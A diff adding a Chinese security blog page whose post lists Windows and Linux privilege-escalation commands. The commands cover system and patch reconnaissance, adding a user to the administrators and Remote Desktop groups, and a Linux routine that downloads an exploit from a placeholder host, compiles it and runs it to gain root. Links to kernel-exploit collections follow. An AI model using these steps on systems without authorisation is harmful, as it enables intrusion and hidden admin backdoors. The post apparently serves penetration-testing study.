@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="tea9的博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <link rel="dns-prefetch" href="http://tea9.xyz">
+  	<link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/github-gist.css">
+    
+      <link rel="stylesheet" href="/css/prettify.css">
+      <link rel="stylesheet" href="/css/highlight/atelier-savanna-light.min.css">
+    
+    <!--SEO-->
+
+<meta name="description" content="心中有光の孩子"/>
+
+
+<meta name="keywords" content="tea9,tea9的博客,开发,android,安全"/>
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+
+<title>内网提权命令 | tea9的博客</title>
+
+
+    <link rel="alternate" href="/atom.xml" title="tea9的博客" type="application/atom+xml">
+
+
+    <link rel="icon" href="/favicon.ico">
+
+    
+
+
+
+
+
+    
+</head>
+  <body>
+    <div class="container">
+	<header class="header">
+	  <div class="blog-title">
+	    <a href="/"> <img src="/img/logo.png"></a>
+	  </div>
+	  <nav>
+	    <ul class="menu">
+	      
+	        <li class="menu-item">
+	          <a href="/" class="menu-item-link nav-underline">首页</a>
+	        </li>&sdot;
+	      
+	        <li class="menu-item">
+	          <a href="/archives" class="menu-item-link nav-underline">归档</a>
+	        </li>&sdot;
+	      
+	        <li class="menu-item">
+	          <a href="/links" class="menu-item-link nav-underline">友链</a>
+	        </li>&sdot;
+	      
+	      	<li class="menu-item">
+	          <a href="/about" class="menu-item-link nav-underline">关于</a>
+			</li>
+		  
+			&sdot;
+			<li class="menu-item">
+				<a href="/search" class="menu-item-link nav-underline">搜索</a>
+			</li>
+		  
+	    </ul>
+	  </nav>
+	</header>
+</div>
+<hr />
+    <div class="container">	
+	<div class="archive-main">
+	    <div class="archive-title">
+	    	<h2>内网提权命令</h2>	    	
+	    </div>
+	    <div class="archive-meta">
+	   	    2018-09-07&nbsp;&nbsp;&sdot;&nbsp;&nbsp; 
+	   	    
+            	<a class="tag" href="/tags/#web安全"title="web安全">web安全</a>&nbsp;&nbsp;
+            
+	    </div>
+		<hr class="one"/>
+		<div class="archive-content typo">
+			<h2 id="Windows基础命令"><a href="#Windows基础命令" class="headerlink" title="Windows基础命令"></a>Windows基础命令</h2><pre><code>net user xx
+
+query user #查看用户登录情况
+
+whoami #当前用户权限
+
+systeminfo #查看当前系统版本与补丁信息
+
+net user xx 123456 /add #添加用户
+
+net localgroup administrators xx /add #添加到管理员组
+
+net localgroup &quot;Remote Desktop Users&quot; xx /add #如远程桌面连接不上那么添加远程桌面组
+
+ipconfig #查看本机ip信息，可加 /all 参数
+
+netstat -ano #查看端口情况
+
+dir c:\ #查看目录
+
+type c:\Users\admin\Desktop\1.txt #查看指定位置文件内容，一般为文本文件
+
+echo 字符串&gt;2.txt #写入文本到文件。特殊字符如&lt;&gt;等前面加^
+
+copy 1.txt 3.php #复制文件
+
+rename d:\2.txt mspaint.bat #将某个路径下的文件重命名
+
+tasklist #查看所有进程占用的端口
+
+taskkill /im xx.ext /f #强制结束指定进程 如 taskkill /im QQMusic.exe /f
+</code></pre><h2 id="Windows基础提权命令"><a href="#Windows基础提权命令" class="headerlink" title="Windows基础提权命令"></a>Windows基础提权命令</h2><pre><code>查看系统信息
+systeminfo|findstr /B/C:&quot;OS名称&quot;/C:&quot;OS版本&quot;
+
+主机名
+Hostname
+
+环境变量
+Set
+
+查看用户信息
+Net user
+Net1 user
+
+查看服务pid号
+Tasklist/svc|find &quot;TermService&quot;
+netstat -ano|find &quot;1488&quot;
+
+查看系统名
+wmic os get caption
+
+查看补丁信息
+wmic dfe get Description,HotFixID,InstalledOn|findstr /C:&quot;KB4013389&quot; /C:&quot;KB958644&quot;
+
+查看当前安装程序
+wmic product get name,version
+</code></pre><h2 id="Linux基础命令"><a href="#Linux基础命令" class="headerlink" title="Linux基础命令"></a>Linux基础命令</h2><pre><code>查看系统版本信息
+    cat /etc/issue
+    cat /etc/*-release
+查看内核版本
+    uname -a
+</code></pre><h2 id="Linux提权基础命令"><a href="#Linux提权基础命令" class="headerlink" title="Linux提权基础命令"></a>Linux提权基础命令</h2><pre><code>基础命令：
+uname -an
+id
+pwd
+cat /etc/issue
+
+套路：
+wget http://exp/exp.c
+gcc -o exp exp.c
+chmod +x exp
+./exp
+...到root
+</code></pre><h2 id="LINK"><a href="#LINK" class="headerlink" title="LINK"></a>LINK</h2><p><a href="https://zhuanlan.zhihu.com/p/42358253" target="_blank" rel="noopener">【权限提升】Linux 提权常用命令集</a><br><a href="https://github.com/SecWiki" target="_blank" rel="noopener">SecWikiGithub</a><br><a href="https://www.sec-wiki.com/" target="_blank" rel="noopener">SecWiki</a><br><a href="https://www.exploit-db.com/local/" target="_blank" rel="noopener">Exploit-db本地提权</a><br><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">Windows提权漏洞集合</a><br><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">Linux提权漏洞集合</a><br><a href="https://github.com/SecWiki/macos-kernel-exploits" target="_blank" rel="noopener">Mac-OS提权漏洞集合</a>  </p>
+ 
+		</div>
+		
+		    <div id="comments">
+		        
+   <p>评论系统未开启，无法评论！</p>
+
+		    </div>
+		
+	</div>
+</div>
+<div id="toc">
+    <div class="archive-toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows基础命令"><span class="toc-text">Windows基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows基础提权命令"><span class="toc-text">Windows基础提权命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux基础命令"><span class="toc-text">Linux基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux提权基础命令"><span class="toc-text">Linux提权基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LINK"><span class="toc-text">LINK</span></a></li></ol>
+    </div>
+</div>
+
+		<hr />
+<div class="footer">
+  
+</div>
+<script src="/js/jquery.min.js"></script>
+ <script src="/js/prettify.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $("pre").addClass(
+      "prettyprint linenums"
+    );
+    prettyPrint();
+  });
+</script>
+
+
+		<div class="copyright">
+	Copyright &copy; 2019 . <br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>
+</div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+</html>
